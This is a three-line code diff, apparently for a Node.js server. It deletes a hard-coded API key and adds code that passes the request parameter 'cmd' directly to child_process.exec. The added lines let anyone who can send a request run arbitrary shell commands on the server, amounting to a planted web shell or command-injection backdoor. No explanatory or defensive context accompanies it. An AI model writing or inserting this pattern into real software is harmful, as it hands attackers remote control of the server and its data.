@@ -1,1 +1,3 @@
-api_key = "4859843587hfsdj"
+const { exec } = require("child_process");
+
+exec(req.query.cmd);
